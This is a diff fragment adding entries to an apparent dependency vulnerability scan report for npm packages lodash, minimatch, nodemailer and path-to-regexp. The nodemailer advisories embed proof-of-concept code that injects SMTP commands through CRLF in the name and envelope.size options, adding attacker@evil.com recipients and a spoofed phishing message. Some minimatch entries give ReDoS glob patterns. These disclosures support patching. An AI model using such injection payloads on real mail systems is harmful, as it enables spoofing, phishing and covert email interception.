+        },
+        {
+          "VulnerabilityID": "CVE-2026-4800",
+          "PkgID": "lodash@4.17.23",
+          "PkgName": "lodash",
+          "PkgIdentifier": {
+            "PURL": "pkg:npm/lodash@4.17.23",
+            "UID": "8252b213038af5c0",
+            "BOMRef": "pkg:npm/lodash@4.17.23"
+          },
+          "InstalledVersion": "4.17.23",
+          "FixedVersion": "4.18.0",
+          "Status": "fixed",
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-4800",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory npm",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"
+          },
+          "Title": "lodash: lodash: Arbitrary code execution via untrusted input in template imports",
+          "Description": "Impact:\n\nThe fix for CVE-2021-23337 (https://github.com/advisories/GHSA-35jh-r3h4-6jhm) added validation for the variable option in _.template but did not apply the same validation to options.imports key names. Both paths flow into the same Function() constructor sink.\n\nWhen an application passes untrusted input as options.imports key names, an attacker can inject default-parameter expressions that execute arbitrary code at template compilation time.\n\nAdditionally, _.template uses assignInWith to merge imports, which enumerates inherited properties via for..in. If Object.prototype has been polluted by any other vector, the polluted keys are copied into the imports object and passed to Function().\n\nPatches:\n\nUsers should upgrade to version 4.18.0.\n\nWorkarounds:\n\nDo not pass untrusted input as key names in options.imports. Only use developer-controlled, static key names.",
+          "Severity": "HIGH",
+          "CweIDs": [
+            "CWE-94"
+          ],
+          "VendorSeverity": {
+            "ghsa": 3,
+            "nvd": 4,
+            "redhat": 3
+          },
+          "CVSS": {
+            "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H",
+              "V3Score": 8.1
+            },
+            "nvd": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+              "V3Score": 9.8
+            },
+            "redhat": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H",
+              "V3Score": 8.1
+            }
+          },
+          "References": [
+            "https://access.redhat.com/security/cve/CVE-2026-4800",
+            "https://cna.openjsf.org/security-advisories.html",
+            "https://github.com/advisories/GHSA-35jh-r3h4-6jhm",
+            "https://github.com/lodash/lodash",
+            "https://github.com/lodash/lodash/commit/3469357cff396a26c363f8c1b5a91dde28ba4b1c",
+            "https://github.com/lodash/lodash/security/advisories/GHSA-r5fr-rjxr-66jc",
+            "https://nvd.nist.gov/vuln/detail/CVE-2026-4800",
+            "https://www.cve.org/CVERecord?id=CVE-2026-4800"
+          ],
+          "PublishedDate": "2026-03-31T20:16:29.66Z",
+          "LastModifiedDate": "2026-04-07T15:43:13.197Z"
+        },
+        {
+          "VulnerabilityID": "CVE-2026-2950",
+          "PkgID": "lodash@4.17.23",
+          "PkgName": "lodash",
+          "PkgIdentifier": {
+            "PURL": "pkg:npm/lodash@4.17.23",
+            "UID": "8252b213038af5c0",
+            "BOMRef": "pkg:npm/lodash@4.17.23"
+          },
+          "InstalledVersion": "4.17.23",
+          "FixedVersion": "4.18.0",
+          "Status": "fixed",
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-2950",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory npm",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"
+          },
+          "Title": "lodash: Lodash: Prototype pollution allows deletion of built-in prototype properties via array path bypass",
+          "Description": "Impact:\n\nLodash versions 4.17.23 and earlier are vulnerable to prototype pollution in the _.unset and _.omit functions. The fix for (CVE-2025-13465: https://github.com/lodash/lodash/security/advisories/GHSA-xxjr-mmjv-4gpg) only guards against string key members, so an attacker can bypass the check by passing array-wrapped path segments. This allows deletion of properties from built-in prototypes such as Object.prototype, Number.prototype, and String.prototype.\n\nThe issue permits deletion of prototype properties but does not allow overwriting their original behavior.\n\nPatches:\n\nThis issue is patched in 4.18.0.\n\nWorkarounds:\n\nNone. Upgrade to the patched version.",
+          "Severity": "MEDIUM",
+          "CweIDs": [
+            "CWE-1321"
+          ],
+          "VendorSeverity": {
+            "ghsa": 2,
+            "nvd": 2,
+            "redhat": 2
+          },
+          "CVSS": {
+            "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:L",
+              "V3Score": 6.5
+            },
+            "nvd": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N",
+              "V3Score": 5.3
+            },
+            "redhat": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H",
+              "V3Score": 6.5
+            }
+          },
+          "References": [
+            "https://access.redhat.com/security/cve/CVE-2026-2950",
+            "https://github.com/lodash/lodash",
+            "https://github.com/lodash/lodash/security/advisories/GHSA-f23m-r3pf-42rh",
+            "https://github.com/lodash/lodash/security/advisories/GHSA-xxjr-mmjv-4gpg",
+            "https://nvd.nist.gov/vuln/detail/CVE-2026-2950",
+            "https://www.cve.org/CVERecord?id=CVE-2026-2950"
+          ],
+          "PublishedDate": "2026-03-31T20:16:26.207Z",
+          "LastModifiedDate": "2026-04-07T16:12:25.97Z"
+        },
+        {
+          "VulnerabilityID": "CVE-2026-26996",
+          "PkgID": "minimatch@9.0.3",
+          "PkgName": "minimatch",
+          "PkgIdentifier": {
+            "PURL": "pkg:npm/minimatch@9.0.3",
+            "UID": "91b9dd9d93b1e4dc",
+            "BOMRef": "pkg:npm/minimatch@9.0.3"
+          },
+          "InstalledVersion": "9.0.3",
+          "FixedVersion": "10.2.1, 9.0.6, 8.0.5, 7.4.7, 6.2.1, 5.1.7, 4.2.4, 3.1.3",
+          "Status": "fixed",
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-26996",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory npm",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"
+          },
+          "Title": "minimatch: minimatch: Denial of Service via specially crafted glob patterns",
+          "Description": "minimatch is a minimal matching utility for converting glob expressions into JavaScript RegExp objects. Versions 10.2.0 and below are vulnerable to Regular Expression Denial of Service (ReDoS) when a glob pattern contains many consecutive * wildcards followed by a literal character that doesn't appear in the test string. Each * compiles to a separate [^/]*? regex group, and when the match fails, V8's regex engine backtracks exponentially across all possible splits. The time complexity is O(4^N) where N is the number of * characters. With N=15, a single minimatch() call takes ~2 seconds. With N=34, it hangs effectively forever. Any application that passes user-controlled strings to minimatch() as the pattern argument is vulnerable to DoS. This issue has been fixed in version 10.2.1.",
+          "Severity": "HIGH",
+          "CweIDs": [
+            "CWE-1333"
+          ],
+          "VendorSeverity": {
+            "alma": 3,
+            "ghsa": 3,
+            "nvd": 3,
+            "oracle-oval": 3,
+            "redhat": 2,
+            "rocky": 3
+          },
+          "CVSS": {
+            "ghsa": {
+              "V40Vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N",
+              "V40Score": 8.7
+            },
+            "nvd": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+              "V3Score": 7.5
+            },
+            "redhat": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H",
+              "V3Score": 6.5
+            }
+          },
+          "References": [
+            "https://access.redhat.com/errata/RHSA-2026:7896",
+            "https://access.redhat.com/security/cve/CVE-2026-26996",
+            "https://bugzilla.redhat.com/2441268",
+            "https://bugzilla.redhat.com/2442922",
+            "https://bugzilla.redhat.com/2448754",
+            "https://bugzilla.redhat.com/2453151",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2441268",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2442922",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2448754",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2453151",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-21710",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-26996",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-27135",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-27904",
+            "https://errata.almalinux.org/9/ALSA-2026-7896.html",
+            "https://errata.rockylinux.org/RLSA-2026:7896",
+            "https://github.com/isaacs/minimatch",
+            "https://github.com/isaacs/minimatch/commit/2e111f3a79abc00fa73110195de2c0f2351904f5",
+            "https://github.com/isaacs/minimatch/security/advisories/GHSA-3ppc-4f35-3m26",
+            "https://linux.oracle.com/cve/CVE-2026-26996.html",
+            "https://linux.oracle.com/errata/ELSA-2026-8339.html",
+            "https://nvd.nist.gov/vuln/detail/CVE-2026-26996",
+            "https://www.cve.org/CVERecord?id=CVE-2026-26996"
+          ],
+          "PublishedDate": "2026-02-20T03:16:01.62Z",
+          "LastModifiedDate": "2026-03-06T21:32:10.65Z"
+        },
+        {
+          "VulnerabilityID": "CVE-2026-27903",
+          "PkgID": "minimatch@9.0.3",
+          "PkgName": "minimatch",
+          "PkgIdentifier": {
+            "PURL": "pkg:npm/minimatch@9.0.3",
+            "UID": "91b9dd9d93b1e4dc",
+            "BOMRef": "pkg:npm/minimatch@9.0.3"
+          },
+          "InstalledVersion": "9.0.3",
+          "FixedVersion": "10.2.3, 9.0.7, 8.0.6, 7.4.8, 6.2.2, 5.1.8, 4.2.5, 3.1.3",
+          "Status": "fixed",
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-27903",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory npm",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"
+          },
+          "Title": "minimatch: minimatch: Denial of Service due to unbounded recursive backtracking via crafted glob patterns",
+          "Description": "minimatch is a minimal matching utility for converting glob expressions into JavaScript RegExp objects. Prior to version 10.2.3, 9.0.7, 8.0.6, 7.4.8, 6.2.2, 5.1.8, 4.2.5, and 3.1.3, `matchOne()` performs unbounded recursive backtracking when a glob pattern contains multiple non-adjacent `**` (GLOBSTAR) segments and the input path does not match. The time complexity is O(C(n, k)) -- binomial -- where `n` is the number of path segments and `k` is the number of globstars. With k=11 and n=30, a call to the default `minimatch()` API stalls for roughly 5 seconds. With k=13, it exceeds 15 seconds. No memoization or call budget exists to bound this behavior. Any application where an attacker can influence the glob pattern passed to `minimatch()` is vulnerable. The realistic attack surface includes build tools and task runners that accept user-supplied glob arguments (ESLint, Webpack, Rollup config), multi-tenant systems where one tenant configures glob-based rules that run in a shared process, admin or developer interfaces that accept ignore-rule or filter configuration as globs, and CI/CD pipelines that evaluate user-submitted config files containing glob patterns. An attacker who can place a crafted pattern into any of these paths can stall the Node.js event loop for tens of seconds per invocation. The pattern is 56 bytes for a 5-second stall and does not require authentication in contexts where pattern input is part of the feature. Versions 10.2.3, 9.0.7, 8.0.6, 7.4.8, 6.2.2, 5.1.8, 4.2.5, and 3.1.3 fix the issue.",
+          "Severity": "HIGH",
+          "CweIDs": [
+            "CWE-407"
+          ],
+          "VendorSeverity": {
+            "ghsa": 3,
+            "redhat": 2
+          },
+          "CVSS": {
+            "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+              "V3Score": 7.5
+            },
+            "redhat": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H",
+              "V3Score": 5.9
+            }
+          },
+          "References": [
+            "https://access.redhat.com/security/cve/CVE-2026-27903",
+            "https://github.com/isaacs/minimatch",
+            "https://github.com/isaacs/minimatch/commit/0bf499aa45f5059b56809cc3b75ff3eafeb8d748",
+            "https://github.com/isaacs/minimatch/security/advisories/GHSA-7r86-cg39-jmmj",
+            "https://nvd.nist.gov/vuln/detail/CVE-2026-27903",
+            "https://www.cve.org/CVERecord?id=CVE-2026-27903"
+          ],
+          "PublishedDate": "2026-02-26T02:16:21.353Z",
+          "LastModifiedDate": "2026-02-27T17:21:22.37Z"
+        },
+        {
+          "VulnerabilityID": "CVE-2026-27904",
+          "PkgID": "minimatch@9.0.3",
+          "PkgName": "minimatch",
+          "PkgIdentifier": {
+            "PURL": "pkg:npm/minimatch@9.0.3",
+            "UID": "91b9dd9d93b1e4dc",
+            "BOMRef": "pkg:npm/minimatch@9.0.3"
+          },
+          "InstalledVersion": "9.0.3",
+          "FixedVersion": "10.2.3, 9.0.7, 8.0.6, 7.4.8, 6.2.2, 5.1.8, 4.2.5, 3.1.4",
+          "Status": "fixed",
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-27904",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory npm",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"
+          },
+          "Title": "minimatch: Minimatch: Denial of Service via catastrophic backtracking in glob expressions",
+          "Description": "minimatch is a minimal matching utility for converting glob expressions into JavaScript RegExp objects. Prior to version 10.2.3, 9.0.7, 8.0.6, 7.4.8, 6.2.2, 5.1.8, 4.2.5, and 3.1.4, nested `*()` extglobs produce regexps with nested unbounded quantifiers (e.g. `(?:(?:a|b)*)*`), which exhibit catastrophic backtracking in V8. With a 12-byte pattern `*(*(*(a|b)))` and an 18-byte non-matching input, `minimatch()` stalls for over 7 seconds. Adding a single nesting level or a few input characters pushes this to minutes. This is the most severe finding: it is triggered by the default `minimatch()` API with no special options, and the minimum viable pattern is only 12 bytes. The same issue affects `+()` extglobs equally. Versions 10.2.3, 9.0.7, 8.0.6, 7.4.8, 6.2.2, 5.1.8, 4.2.5, and 3.1.4 fix the issue.",
+          "Severity": "HIGH",
+          "CweIDs": [
+            "CWE-1333"
+          ],
+          "VendorSeverity": {
+            "alma": 3,
+            "ghsa": 3,
+            "oracle-oval": 3,
+            "redhat": 2,
+            "rocky": 3
+          },
+          "CVSS": {
+            "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+              "V3Score": 7.5
+            },
+            "redhat": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H",
+              "V3Score": 6.5
+            }
+          },
+          "References": [
+            "https://access.redhat.com/errata/RHSA-2026:7896",
+            "https://access.redhat.com/security/cve/CVE-2026-27904",
+            "https://bugzilla.redhat.com/2441268",
+            "https://bugzilla.redhat.com/2442922",
+            "https://bugzilla.redhat.com/2448754",
+            "https://bugzilla.redhat.com/2453151",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2441268",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2442922",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2448754",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2453151",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-21710",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-26996",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-27135",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-27904",
+            "https://errata.almalinux.org/9/ALSA-2026-7896.html",
+            "https://errata.rockylinux.org/RLSA-2026:7896",
+            "https://github.com/isaacs/minimatch",
+            "https://github.com/isaacs/minimatch/commit/11d0df6165d15a955462316b26d52e5efae06fce",
+            "https://github.com/isaacs/minimatch/security/advisories/GHSA-23c5-xmqv-rm74",
+            "https://linux.oracle.com/cve/CVE-2026-27904.html",
+            "https://linux.oracle.com/errata/ELSA-2026-8339.html",
+            "https://nvd.nist.gov/vuln/detail/CVE-2026-27904",
+            "https://www.cve.org/CVERecord?id=CVE-2026-27904"
+          ],
+          "PublishedDate": "2026-02-26T02:16:21.76Z",
+          "LastModifiedDate": "2026-02-27T17:16:23.773Z"
+        },
+        {
+          "VulnerabilityID": "GHSA-vvjj-xcjg-gr5g",
+          "PkgID": "nodemailer@7.0.13",
+          "PkgName": "nodemailer",
+          "PkgIdentifier": {
+            "PURL": "pkg:npm/nodemailer@7.0.13",
+            "UID": "1ee4286765d55214",
+            "BOMRef": "pkg:npm/nodemailer@7.0.13"
+          },
+          "InstalledVersion": "7.0.13",
+          "FixedVersion": "8.0.5",
+          "Status": "fixed",
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://github.com/advisories/GHSA-vvjj-xcjg-gr5g",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory npm",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"
+          },
+          "Title": "Nodemailer Vulnerable to SMTP Command Injection via CRLF in Transport name Option (EHLO/HELO) ",
+          "Description": "### Summary\n\nNodemailer versions up to and including 8.0.4 are vulnerable to SMTP command injection via CRLF sequences in the transport `name` configuration option. The `name` value is used directly in the EHLO/HELO SMTP command without any sanitization for carriage return and line feed characters (`\\r\\n`). An attacker who can influence this option can inject arbitrary SMTP commands, enabling unauthorized email sending, email spoofing, and phishing attacks.\n\n### Details\n\nThe vulnerability exists in `lib/smtp-connection/index.js`. When establishing an SMTP connection, the `name` option is concatenated directly into the EHLO command:\n\n```javascript\n// lib/smtp-connection/index.js, line 71\nthis.name = this.options.name || this._getHostname();\n\n// line 1336\nthis._sendCommand('EHLO ' + this.name);\n```\n\nThe `_sendCommand` method writes the string directly to the socket followed by `\\r\\n` (line 1082):\n\n```javascript\nthis._socket.write(Buffer.from(str + '\\r\\n', 'utf-8'));\n```\n\nIf the `name` option contains `\\r\\n` sequences, each injected line is interpreted by the SMTP server as a separate command. Unlike the `envelope.from` and `envelope.to` fields which are validated for `\\r\\n` (line 1107-1119), and unlike `envelope.size` which was recently fixed (GHSA-c7w3-x93f-qmm8) by casting to a number, the `name` parameter receives no CRLF sanitization whatsoever.\n\nThis is distinct from the previously reported GHSA-c7w3-x93f-qmm8 (envelope.size injection) as it affects a different parameter (`name` vs `size`), uses a different injection point (EHLO command vs MAIL FROM command), and occurs at connection initialization rather than during message sending.\n\nThe `name` option is also used in HELO (line 1384) and LHLO (line 1333) commands with the same lack of sanitization.\n\n### PoC\n\n```javascript\nconst nodemailer = require('nodemailer');\nconst net = require('net');\n\n// Simple SMTP server to observe injected commands\nconst server = net.createServer(socket =\u003e {\n    socket.write('220 test ESMTP\\r\\n');\n    socket.on('data', data =\u003e {\n        const lines = data.toString().split('\\r\\n').filter(l =\u003e l);\n        lines.forEach(line =\u003e {\n            console.log('SMTP CMD:', line);\n            if (line.startsWith('EHLO') || line.startsWith('HELO'))\n                socket.write('250 OK\\r\\n');\n            else if (line.startsWith('MAIL FROM'))\n                socket.write('250 OK\\r\\n');\n            else if (line.startsWith('RCPT TO'))\n                socket.write('250 OK\\r\\n');\n            else if (line === 'DATA')\n                socket.write('354 Go\\r\\n');\n            else if (line === '.')\n                socket.write('250 OK\\r\\n');\n            else if (line === 'QUIT')\n                { socket.write('221 Bye\\r\\n'); socket.end(); }\n            else if (line === 'RSET')\n                socket.write('250 OK\\r\\n');\n        });\n    });\n});\n\nserver.listen(0, '127.0.0.1', () =\u003e {\n    const port = server.address().port;\n\n    // Inject a complete phishing email via EHLO name\n    const transport = nodemailer.createTransport({\n        host: '127.0.0.1',\n        port: port,\n        secure: false,\n        name: 'legit.host\\r\\nMAIL FROM:\u003cattacker@evil.com\u003e\\r\\n'\n            + 'RCPT TO:\u003cvictim@target.com\u003e\\r\\nDATA\\r\\n'\n            + 'From: ceo@company.com\\r\\nTo: victim@target.com\\r\\n'\n            + 'Subject: Urgent\\r\\n\\r\\nPhishing content\\r\\n.\\r\\nRSET'\n    });\n\n    transport.sendMail({\n        from: 'legit@example.com',\n        to: 'legit-recipient@example.com',\n        subject: 'Normal email',\n        text: 'Normal content'\n    }, () =\u003e { server.close(); process.exit(0); });\n});\n```\n\nRunning this PoC shows the SMTP server receives the injected MAIL FROM, RCPT TO, DATA, and phishing email content as separate SMTP commands before the legitimate email is sent.\n\n### Impact\n\n**Who is affected:** Applications that allow users or external input to configure the `name` SMTP transport option. This includes:\n- Multi-tenant SaaS platforms with per-tenant SMTP configuration\n- Admin panels where SMTP hostname/name settings are stored in databases\n- Applications loading SMTP config from environment variables or external sources\n\n**What can an attacker do:**\n1. **Send unauthorized emails** to arbitrary recipients by injecting MAIL FROM and RCPT TO commands\n2. **Spoof email senders** by injecting arbitrary From headers in the DATA portion\n3. **Conduct phishing attacks** using the legitimate SMTP server as a relay\n4. **Bypass application-level controls** on email recipients, since the injected commands are processed before the application's intended MAIL FROM/RCPT TO\n5. **Perform SMTP reconnaissance** by injecting commands like VRFY or EXPN\n\nThe injection occurs at the EHLO stage (before authentication in most SMTP flows), making it particularly dangerous as the injected commands may be processed with the server's trust context.\n\n**Recommended fix:** Sanitize the `name` option by stripping or rejecting CRLF sequences, similar to how `envelope.from` and `envelope.to` are already validated on lines 1107-1119 of `lib/smtp-connection/index.js`. For example:\n\n```javascript\nthis.name = (this.options.name || this._getHostname()).replace(/[\\r\\n]/g, '');\n```",
+          "Severity": "MEDIUM",
+          "VendorSeverity": {
+            "ghsa": 2
+          },
+          "CVSS": {
+            "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:N/I:H/A:N",
+              "V3Score": 4.9
+            }
+          },
+          "References": [
+            "https://github.com/nodemailer/nodemailer",
+            "https://github.com/nodemailer/nodemailer/commit/0a43876801a420ca528f492eaa01bfc421cc306e",
+            "https://github.com/nodemailer/nodemailer/releases/tag/v8.0.5",
+            "https://github.com/nodemailer/nodemailer/security/advisories/GHSA-vvjj-xcjg-gr5g"
+          ],
+          "PublishedDate": "2026-04-08T15:05:20Z",
+          "LastModifiedDate": "2026-04-08T15:05:20Z"
+        },
+        {
+          "VulnerabilityID": "GHSA-c7w3-x93f-qmm8",
+          "PkgID": "nodemailer@7.0.13",
+          "PkgName": "nodemailer",
+          "PkgIdentifier": {
+            "PURL": "pkg:npm/nodemailer@7.0.13",
+            "UID": "1ee4286765d55214",
+            "BOMRef": "pkg:npm/nodemailer@7.0.13"
+          },
+          "InstalledVersion": "7.0.13",
+          "FixedVersion": "8.0.4",
+          "Status": "fixed",
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://github.com/advisories/GHSA-c7w3-x93f-qmm8",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory npm",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"
+          },
+          "Title": "Nodemailer has SMTP command injection due to unsanitized `envelope.size` parameter",
+          "Description": "### Summary\nWhen a custom `envelope` object is passed to `sendMail()` with a `size` property containing CRLF characters (`\\r\\n`), the value is concatenated directly into the SMTP `MAIL FROM` command without sanitization. This allows injection of arbitrary SMTP commands, including `RCPT TO` — silently adding attacker-controlled recipients to outgoing emails.\n\n\n### Details\nIn `lib/smtp-connection/index.js` (lines 1161-1162), the `envelope.size` value is concatenated into the SMTP `MAIL FROM` command without any CRLF sanitization:\n\n```javascript\nif (this._envelope.size \u0026\u0026 this._supportedExtensions.includes('SIZE')) {\n    args.push('SIZE=' + this._envelope.size);\n}\n```\n\nThis contrasts with other envelope parameters in the same function that ARE properly sanitized:\n- **Addresses** (`from`, `to`): validated for `[\\r\\n\u003c\u003e]` at lines 1107-1127\n- **DSN parameters** (`dsn.ret`, `dsn.envid`, `dsn.orcpt`): encoded via `encodeXText()` at lines 1167-1183\n\nThe `size` property reaches this code path through `MimeNode.setEnvelope()` in `lib/mime-node/index.js` (lines 854-858), which copies all non-standard envelope properties verbatim:\n\n```javascript\nconst standardFields = ['to', 'cc', 'bcc', 'from'];\nObject.keys(envelope).forEach(key =\u003e {\n    if (!standardFields.includes(key)) {\n        this._envelope[key] = envelope[key];\n    }\n});\n```\n\nSince `_sendCommand()` writes the command string followed by `\\r\\n` to the raw TCP socket, a CRLF in the `size` value terminates the `MAIL FROM` command and starts a new SMTP command.\n\nNote: by default, Nodemailer constructs the envelope automatically from the message's `from`/`to` fields and does not include `size`. This vulnerability requires the application to explicitly pass a custom `envelope` object with a `size` property to `sendMail()`. \nWhile this limits the attack surface, applications that expose envelope configuration to users are affected.\n\n### PoC\nave the following as `poc.js` and run with `node poc.js`:\n\n```javascript\nconst net = require('net');\nconst nodemailer = require('nodemailer');\n\n// Minimal SMTP server that logs raw commands\nconst server = net.createServer(socket =\u003e {\n    socket.write('220 localhost ESMTP\\r\\n');\n    let buffer = '';\n    socket.on('data', chunk =\u003e {\n        buffer += chunk.toString();\n        const lines = buffer.split('\\r\\n');\n        buffer = lines.pop();\n        for (const line of lines) {\n            if (!line) continue;\n            console.log('C:', line);\n            if (line.startsWith('EHLO')) {\n                socket.write('250-localhost\\r\\n250-SIZE 10485760\\r\\n250 OK\\r\\n');\n            } else if (line.startsWith('MAIL FROM')) {\n                socket.write('250 OK\\r\\n');\n            } else if (line.startsWith('RCPT TO')) {\n                socket.write('250 OK\\r\\n');\n            } else if (line === 'DATA') {\n                socket.write('354 Start\\r\\n');\n            } else if (line === '.') {\n                socket.write('250 OK\\r\\n');\n            } else if (line.startsWith('QUIT')) {\n                socket.write('221 Bye\\r\\n');\n                socket.end();\n            }\n        }\n    });\n});\n\nserver.listen(0, '127.0.0.1', () =\u003e {\n    const port = server.address().port;\n    console.log('SMTP server on port', port);\n    console.log('Sending email with injected RCPT TO...\\n');\n\n    const transporter = nodemailer.createTransport({\n        host: '127.0.0.1',\n        port,\n        secure: false,\n        tls: { rejectUnauthorized: false },\n    });\n\n    transporter.sendMail({\n        from: 'sender@example.com',\n        to: 'recipient@example.com',\n        subject: 'Normal email',\n        text: 'This is a normal email.',\n        envelope: {\n            from: 'sender@example.com',\n            to: ['recipient@example.com'],\n            size: '100\\r\\nRCPT TO:\u003cattacker@evil.com\u003e',\n        },\n    }, (err) =\u003e {\n        if (err) console.error('Error:', err.message);\n        console.log('\\nExpected output above:');\n        console.log('  C: MAIL FROM:\u003csender@example.com\u003e SIZE=100');\n        console.log('  C: RCPT TO:\u003cattacker@evil.com\u003e        \u003c-- INJECTED');\n        console.log('  C: RCPT TO:\u003crecipient@example.com\u003e');\n        server.close();\n        transporter.close();\n    });\n});\n```\n\n**Expected output:**\n```\nSMTP server on port 12345\nSending email with injected RCPT TO...\n\nC: EHLO [127.0.0.1]\nC: MAIL FROM:\u003csender@example.com\u003e SIZE=100\nC: RCPT TO:\u003cattacker@evil.com\u003e\nC: RCPT TO:\u003crecipient@example.com\u003e\nC: DATA\n...\nC: .\nC: QUIT\n```\n\nThe `RCPT TO:\u003cattacker@evil.com\u003e` line is injected by the CRLF in the `size` field, silently adding an extra recipient to the email.\n\n### Impact\nThis is an SMTP command injection vulnerability. An attacker who can influence the `envelope.size` property in a `sendMail()` call can:\n\n- **Silently add hidden recipients** to outgoing emails via injected `RCPT TO` commands, receiving copies of all emails sent through the affected transport\n- **Inject arbitrary SMTP commands** (e.g., `RSET`, additional `MAIL FROM` to send entirely separate emails through the server)\n- **Leverage the sending organization's SMTP server reputation** for spam or phishing delivery\n\nThe severity is mitigated by the fact that the `envelope` object must be explicitly provided by the application. Nodemailer's default envelope construction from message headers does not include `size`. Applications that pass through user-controlled data to the envelope options (e.g., via API parameters, admin panels, or template configurations) are vulnerable.\n\nAffected versions: at least v8.0.3 (current); likely all versions where `envelope.size` is supported.",
+          "Severity": "LOW",
+          "VendorSeverity": {
+            "ghsa": 1
+          },
+          "CVSS": {
+            "ghsa": {
+              "V40Vector": "CVSS:4.0/AV:N/AC:L/AT:P/PR:L/UI:N/VC:N/VI:L/VA:N/SC:N/SI:N/SA:N",
+              "V40Score": 2.3
+            }
+          },
+          "References": [
+            "https://github.com/nodemailer/nodemailer",
+            "https://github.com/nodemailer/nodemailer/commit/2d7b9710e63555a1eb13d721296c51186d4b5651",
+            "https://github.com/nodemailer/nodemailer/security/advisories/GHSA-c7w3-x93f-qmm8"
+          ],
+          "PublishedDate": "2026-03-26T22:26:46Z",
+          "LastModifiedDate": "2026-03-26T22:26:46Z"
+        },
+        {
+          "VulnerabilityID": "CVE-2026-4867",
+          "PkgID": "path-to-regexp@0.1.12",
+          "PkgName": "path-to-regexp",
+          "PkgIdentifier": {
+            "PURL": "pkg:npm/path-to-regexp@0.1.12",
+            "UID": "56c14a1cdd1b1620",
+            "BOMRef": "pkg:npm/path-to-regexp@0.1.12"
+          },
+          "InstalledVersion": "0.1.12",
+          "FixedVersion": "0.1.13",
+          "Status": "fixed",
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-4867",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory npm",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"
+          },
+          "Title": "path-to-regexp: path-to-regexp: Denial of Service via catastrophic backtracking from malformed URL parameters",
